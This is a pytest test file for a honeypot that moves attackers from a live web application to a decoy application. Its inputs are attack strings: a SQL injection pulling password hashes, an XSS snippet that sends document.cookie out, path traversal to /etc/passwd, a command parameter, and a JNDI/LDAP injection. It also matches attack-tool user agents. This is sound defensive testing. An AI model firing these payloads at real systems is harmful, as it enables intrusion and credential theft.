"""Diverting attackers to a decoy application (HONEYPOT_HTTP_DECOY_UPSTREAM).

Two stand-in applications sit behind the decoy, one live and one decoy, and
each says which it is in every answer. A login succeeds with the password
"right" and sets a session cookie named after the application.
"""

import asyncio
import json

import httpx
import pytest

from honeypot.core.config import config
from honeypot.core.session import session_manager
from honeypot.emulators.http import HTTPHoneypot
from honeypot.security.diversion import (
    DiversionTable,
    diversion_table,
    issued_tokens,
    request_token,
    scanner_agent,
)

DECOY_PORT = 24430
LIVE_PORT = 24431
DECOY_APP_PORT = 24432

BROWSER = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36"
OTHER_BROWSER = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"


def _application(name: str):
    async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        request_line = (await reader.readline()).decode()
        headers = {}
        while (line := await reader.readline()) not in (b"\r\n", b""):
            key, _, value = line.decode().partition(":")
            headers[key.strip().lower()] = value.strip()
        body = await reader.readexactly(int(headers.get("content-length", 0)))
        method, target, _ = request_line.split()

        status, extra = "200 OK", ""
        if target == "/api/auth/login":
            if json.loads(body or b"{}").get("password") == "right":
                extra = f"Set-Cookie: sid={name}-session; Path=/; HttpOnly\r\n"
            else:
                status = "401 Unauthorized"
        echo = json.dumps({"app": name, "target": target, "cookie": headers.get("cookie")}).encode()
        writer.write(
            f"HTTP/1.1 {status}\r\nContent-Type: application/json\r\n{extra}"
            f"Connection: close\r\nContent-Length: {len(echo)}\r\n\r\n".encode() + echo
        )
        await writer.drain()
        writer.close()

    return handle


@pytest.fixture
async def site(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "bind_address", "127.0.0.1")
    monkeypatch.setattr(config, "enable_anti_fingerprinting", False)
    monkeypatch.setattr(config, "session_capture_dir", str(tmp_path / "sessions"))
    monkeypatch.setattr(config, "file_capture_dir", str(tmp_path / "uploads"))
    monkeypatch.setattr(config, "http_upstream", f"http://127.0.0.1:{LIVE_PORT}")
    monkeypatch.setattr(config, "http_decoy_upstream", f"http://127.0.0.1:{DECOY_APP_PORT}")
    monkeypatch.setattr(config, "http_upstream_owns", "/login,/admin")
    monkeypatch.setattr(config, "http_session_cookie", "sid")
    monkeypatch.setattr(diversion_table, "failed_login_limit", 3)
    diversion_table.clear()
    ingested: asyncio.Queue = asyncio.Queue()

    async def capture_ingest(session):
        await ingested.put(session.to_backend_payload())

    monkeypatch.setattr(session_manager, "_send_to_backend", capture_ingest)
    live = await asyncio.start_server(_application("live"), "127.0.0.1", LIVE_PORT)
    decoy = await asyncio.start_server(_application("decoy"), "127.0.0.1", DECOY_APP_PORT)
    honeypot = HTTPHoneypot(use_tls=False)
    honeypot.port = DECOY_PORT
    await honeypot.start()
    try:
        yield f"http://127.0.0.1:{DECOY_PORT}", ingested
    finally:
        await honeypot.stop()
        for server in (live, decoy):
            server.close()
            await server.wait_closed()
        diversion_table.clear()


def _client(base_url: str, agent: str = BROWSER, **kwargs) -> httpx.AsyncClient:
    return httpx.AsyncClient(base_url=base_url, headers={"user-agent": agent}, **kwargs)


def _diversions(payload: dict) -> list[dict]:
    return [e for e in payload["events"] if e["event_type"] == "http_diversion"]


async def test_an_ordinary_visit_never_leaves_the_live_application(site):
    base_url, ingested = site
    async with _client(base_url) as client:
        answers = [
            await client.get("/"),
            await client.get("/api/products", params={"q": "cordless drill", "aisle": "2", "page": "2", "inStock": "1"}),
            await client.get("/robots.txt"),
            await client.post("/api/cart", json={"product_id": 12, "quantity": 2}),
            await client.post("/api/auth/login", json={"email": "sam@example.com", "password": "wrong"}),
            await client.post("/api/auth/login", json={"email": "sam@example.com", "password": "right"}),
            await client.get("/api/account"),
        ]
    apps = [a.json()["app"] for a in answers if a.headers.get("content-type") == "application/json"]
    assert apps == ["live"] * 6
    payload = await asyncio.wait_for(ingested.get(), timeout=10)
    assert _diversions(payload) == []
    assert not any("decoy application" in t["output"] for t in payload["transcript"])


async def test_an_injection_is_answered_by_the_decoy_and_so_is_everything_after(site):
    base_url, ingested = site
    async with _client(base_url) as client:
        before = await client.get("/api/products")
        attack = await client.get("/api/products", params={"q": "1' union select email,password_hash from users--"})
        after = await client.get("/api/account")
    assert before.json()["app"] == "live"
    assert attack.json()["app"] == "decoy"
    assert after.json()["app"] == "decoy"

    payload = await asyncio.wait_for(ingested.get(), timeout=10)
    [event] = _diversions(payload)
    assert event["reason"] == "sql_injection in the request"
    assert event["path"] == "/api/products"
    outputs = [t["output"] for t in payload["transcript"]]
    assert outputs[0] == "HTTP/1.1 200 OK"
    assert outputs[1:] == ["HTTP/1.1 200 OK  [answered by the decoy application]"] * 2
    assert "attack_detected" in [p["type"] for p in payload["packets"]]


async def test_an_attack_in_the_body_diverts(site):
    base_url, _ = site
    async with _client(base_url) as client:
        attack = await client.post("/api/reviews", json={"body": "<script>fetch('//x/'+document.cookie)</script>"})
        after = await client.get("/")
    assert attack.json()["app"] == after.json()["app"] == "decoy"


async def test_the_diversion_outlives_the_connection(site):
    base_url, _ = site
    async with _client(base_url) as client:
        await client.get("/api/files", params={"path": "../../etc/passwd"})
    async with _client(base_url) as client:
        later = await client.get("/")
    assert later.json()["app"] == "decoy"


async def test_someone_else_at_the_same_address_is_not_diverted(site):
    base_url, _ = site
    async with _client(base_url) as attacker:
        await attacker.get("/", params={"cmd": "id"})
    async with _client(base_url, OTHER_BROWSER) as neighbour:
        answer = await neighbour.get("/")
    assert answer.json()["app"] == "live"


async def test_a_bait_path_keeps_its_decoy_page_and_diverts_what_follows(site):
    base_url, ingested = site
    async with _client(base_url) as client:
        env = await client.get("/.env")
        after = await client.get("/")
    assert "DB_PASS=" in env.text
    assert after.json()["app"] == "decoy"
    payload = await asyncio.wait_for(ingested.get(), timeout=10)
    assert _diversions(payload)[0]["reason"] == "requested bait path /.env"


async def test_robots_txt_is_not_a_reason_to_divert(site):
    base_url, _ = site
    async with _client(base_url) as client:
        await client.get("/robots.txt")
        await client.get("/sitemap.xml")
        answer = await client.get("/")
    assert answer.json()["app"] == "live"


async def test_an_attack_tool_is_diverted_from_its_first_request(site):
    base_url, ingested = site
    async with _client(base_url, "sqlmap/1.8.4#stable (https://sqlmap.org)") as client:
        answer = await client.get("/")
    assert answer.json()["app"] == "decoy"
    payload = await asyncio.wait_for(ingested.get(), timeout=10)
    assert _diversions(payload)[0]["reason"] == "attack tool user agent (sqlmap)"


async def test_repeated_failed_logins_divert_after_the_limit(site):
    base_url, ingested = site
    async with _client(base_url) as client:
        answers = [
            await client.post("/api/auth/login", json={"email": "admin@example.test", "password": p})
            for p in ("admin", "123456", "password", "admin1234")
        ]
    # The limit is 3: the third failure is still the live application's
    # answer, and the attempt after it is the decoy's.
    assert [a.json()["app"] for a in answers] == ["live", "live", "live", "decoy"]
    assert [a.status_code for a in answers] == [401] * 4
    payload = await asyncio.wait_for(ingested.get(), timeout=10)
    assert _diversions(payload)[0]["reason"] == "3 failed logins in 10 minutes"
    assert len(payload["credentials"]) == 4


async def test_a_diverted_session_stays_diverted_from_a_new_address(site):
    base_url, _ = site
    async with _client(base_url) as attacker:
        await attacker.get("/", params={"q": "${jndi:ldap://x/a}"})
        login = await attacker.post("/api/auth/login", json={"email": "a@example.test", "password": "right"})
    assert login.json()["app"] == "decoy"
    assert login.cookies["sid"] == "decoy-session"

    # Same session cookie, different client: as if the attacker's address and
    # browser changed but the cookie jar came along.
    async with _client(base_url, OTHER_BROWSER, cookies={"sid": "decoy-session"}) as moved:
        answer = await moved.get("/api/account")
    assert answer.json()["app"] == "decoy"


async def test_a_live_session_cookie_is_not_a_reason_to_divert(site):
    base_url, _ = site
    async with _client(base_url, cookies={"sid": "live-session"}) as client:
        answer = await client.get("/api/account")
    assert answer.json()["app"] == "live"


async def test_the_mark_lapses_after_the_client_goes_quiet(site, monkeypatch):
    base_url, _ = site
    now = [1000.0]
    monkeypatch.setattr(diversion_table, "_clock", lambda: now[0])
    async with _client(base_url) as client:
        await client.get("/", params={"cmd": "id"})
        now[0] += diversion_table.ttl - 1
        still = await client.get("/")
        now[0] += diversion_table.ttl - 1  # renewed by the request above
        renewed = await client.get("/")
        now[0] += diversion_table.ttl + 1
        lapsed = await client.get("/")
    assert still.json()["app"] == renewed.json()["app"] == "decoy"
    assert lapsed.json()["app"] == "live"


async def test_no_decoy_configured_means_no_diversion(site, monkeypatch):
    base_url, _ = site
    monkeypatch.setattr(config, "http_decoy_upstream", "")
    honeypot = HTTPHoneypot(use_tls=False)
    honeypot.port = DECOY_PORT + 9
    await honeypot.start()
    try:
        async with _client(f"http://127.0.0.1:{DECOY_PORT + 9}", "sqlmap/1.8") as client:
            attack = await client.get("/", params={"q": "1' union select 1--"})
            after = await client.get("/")
    finally:
        await honeypot.stop()
    assert attack.json()["app"] == after.json()["app"] == "live"


class TestSignals:
    def test_attack_tools_are_named(self):
        assert scanner_agent("Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)") == "nikto"
        assert scanner_agent("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)") == "nmap scripting engine"
        assert scanner_agent(BROWSER) is None
        assert scanner_agent("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)") is None
        assert scanner_agent("curl/8.9.1") is None

    def test_session_cookie_is_read_by_name_only(self):
        headers = {"cookie": "theme=dark; sid=abc123; consent=yes"}
        assert request_token(headers, "sid") == "abc123"
        assert request_token(headers, "") is None
        assert request_token({"cookie": "xsid=abc"}, "sid") is None
        assert request_token({}, "sid") is None

    def test_issued_tokens_skip_cookies_being_cleared(self):
        response = (
            b"HTTP/1.1 200 OK\r\nSet-Cookie: sid=tok1; Path=/; HttpOnly\r\n"
            b"set-cookie: theme=dark\r\nSet-Cookie: sid=; Expires=Thu, 01 Jan 1970 00:00:00 GMT\r\n\r\n"
            b"Set-Cookie: sid=body-not-header"
        )
        assert issued_tokens(response, "sid") == ["tok1"]
        assert issued_tokens(response, "") == []

    def test_table_is_bounded(self, monkeypatch):
        monkeypatch.setattr(DiversionTable, "MAX_ENTRIES", 3)
        table = DiversionTable(ttl=60, failed_login_limit=5)
        for n in range(5):
            table.divert(f"198.51.100.{n}", BROWSER, f"t{n}", "test")
        assert table.lookup("198.51.100.0", BROWSER, None) is None
        assert table.lookup("198.51.100.4", BROWSER, None) is not None
        assert len(table._clients) == 3 and len(table._tokens) == 3

    def test_failed_logins_outside_the_window_are_forgotten(self):
        now = [0.0]
        table = DiversionTable(ttl=60, failed_login_limit=3, clock=lambda: now[0])
        assert table.failed_login("198.51.100.1", BROWSER) == 1
        now[0] += 601
        assert table.failed_login("198.51.100.1", BROWSER) == 1
        assert table.failed_login("198.51.100.1", BROWSER) == 2


async def test_separate_connections_from_one_client_make_one_session(site, monkeypatch):
    """A scanner that opens a fresh connection per request lands in a single
    session, not one per request (config.http_session_idle coalesces them)."""
    monkeypatch.setattr(config, "http_session_idle", 0.5)
    base_url, ingested = site
    # Each request on its own connection (Connection: close), same identity.
    for path in ("/", "/products", "/.env", "/admin/"):
        async with _client(base_url) as client:
            await client.get(path, headers={"connection": "close"})
    payload = await asyncio.wait_for(ingested.get(), timeout=10)
    # One ingested session carrying every request, not four.
    requests = [t for t in payload["transcript"] if t["command"].startswith("GET ")]
    assert len(requests) == 4
    assert ingested.empty()


async def test_different_user_agents_are_separate_sessions(site, monkeypatch):
    monkeypatch.setattr(config, "http_session_idle", 0.5)
    base_url, ingested = site
    async with _client(base_url, BROWSER) as a:
        await a.get("/", headers={"connection": "close"})
    async with _client(base_url, OTHER_BROWSER) as b:
        await b.get("/", headers={"connection": "close"})
    first = await asyncio.wait_for(ingested.get(), timeout=10)
    second = await asyncio.wait_for(ingested.get(), timeout=10)
    assert first["session_id"] != second["session_id"]
